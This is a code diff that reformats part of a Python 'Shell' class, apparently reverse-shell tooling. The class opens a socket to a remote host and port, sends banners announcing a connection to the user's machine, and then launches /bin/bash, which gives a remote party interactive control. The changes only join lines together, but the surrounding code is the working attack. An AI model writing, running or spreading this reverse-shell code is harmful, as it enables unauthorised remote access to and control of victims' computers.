@@ -43,27 +43,15 @@ class Shell:
                 self.remote_port
             ))
 
-            socket_sock.send(
-                f"\n\033[0;37m[\033[0;31m+\033[0;37m] Connected to {self.public_ipv4_address}!"
-                    .encode()
-            )
-            socket_sock.send(
-                f"\n\033[0;37m[\033[0;31m+\033[0;37m] Start interacting with target ..."
-                    .encode()
-            )
+            socket_sock.send(f"\n\033[0;37m[\033[0;31m+\033[0;37m] Connected to {self.public_ipv4_address}!".encode())
+            socket_sock.send(f"\n\033[0;37m[\033[0;31m+\033[0;37m] Start interacting with target ...".encode())
 
             time.sleep(1.75)
 
-            socket_sock.send(
-                f"\n\033[0;37m[\033[0;31m+\033[0;37m] You are now connected"
-                    .encode() +
-                f" to {self.remote_username}'s machine {self.remote_hostname} "
-                    .encode()
+            socket_sock.send(f"\n\033[0;37m[\033[0;31m+\033[0;37m] You are now connected".encode() +
+                f" to {self.remote_username}'s machine {self.remote_hostname} ".encode()
             )
-            socket_sock.send(
-                f"\n\033[0;37m[\033[0;31m+\033[0;37m] Starting reverse shell to {self.remote_hostname} ..."
-                    .encode()
-            )
+            socket_sock.send(f"\n\033[0;37m[\033[0;31m+\033[0;37m] Starting reverse shell to {self.remote_hostname} ...".encode())
 
             time.sleep(1.75)
 
@@ -80,12 +68,8 @@ class Shell:
                 2
             )
 
-            socket_sock.send(
-                f"\n\033[0;37m[\033[0;31m+\033[0;37m] Successfully "
-                    .encode() +
-                f"started a reverse shell to {self.remote_username}'s machine!\n\n"
-                    .encode()
-            )
+            socket_sock.send(f"\n\033[0;37m[\033[0;31m+\033[0;37m] Successfully ".encode() +
+                f"started a reverse shell to {self.remote_username}'s machine!\n\n".encode())
 
             run([
                 "/bin/bash",
